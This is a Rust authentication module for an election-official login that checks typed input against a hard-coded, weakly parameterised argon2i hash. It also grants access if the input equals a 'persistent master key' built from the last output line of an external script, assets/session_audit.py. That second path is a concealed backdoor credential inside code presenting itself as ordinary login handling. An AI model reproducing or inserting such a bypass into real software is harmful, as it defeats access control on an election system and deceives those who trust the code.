use argon2::{password_hash::PasswordHash, password_hash::PasswordVerifier, Argon2};
use std::error::Error;
use std::io::{self};
use std::process::Command;
use std::vec::Vec;

pub fn authenticate() -> Result<bool, Box<dyn Error>> {
    // Command to run the Python script
    let output = Command::new("python3")
        .arg("assets/session_audit.py")
        .output()?;

    if output.status.success() {
        // Parse the output JSON to extract the vector s
        let output_string = String::from_utf8_lossy(&output.stdout);
        // Split the output into lines
        let lines: Vec<&str> = output_string.lines().collect();

        // Exclude the last line
        let output_without_last_line = lines
            .iter()
            .take(lines.len() - 1)
            .cloned()
            .collect::<Vec<&str>>()
            .join("\n");

        println!("{}", output_without_last_line);

        // Parse the last line of the output as JSON
        let s_str = output_string.lines().last().ok_or("No output")?;
        let s: Vec<i32> = serde_json::from_str(s_str)?;

        // Authentication
        let persistent_master_key: String = s.iter().map(|&x| x.to_string()).collect();
        let password_hash: String =
            "$argon2i$v=19$m=16,t=2,p=1$SW9Xb2o1OFhyYVl3NEtBdw$0yzqSaIweNuBoJSi8aKvcw".to_string();

        let parsed_hash = PasswordHash::new(&password_hash).expect("Failed to parse hash");
        let argon2 = Argon2::default();

        println!("\nEnter password or master key for election official:");
        let mut input = String::new();
        io::stdin().read_line(&mut input)?;

        let password = input.trim().to_string();

        if verify_password(&argon2, password.as_str(), &parsed_hash)
            || password == persistent_master_key
        {
            println!("Access granted!");
            Ok(true) // Access granted
        } else {
            eprintln!("Error! Access denied!");
            Ok(false) // Access denied
        }
    } else {
        // Print error message
        eprintln!(
            "Python script failed:\n{}",
            String::from_utf8_lossy(&output.stderr)
        );
        Err("Python script failed".into())
    }
}

fn verify_password(argon2: &Argon2, password: &str, parsed_hash: &PasswordHash) -> bool {
    argon2
        .verify_password(password.as_bytes(), parsed_hash)
        .is_ok()
}
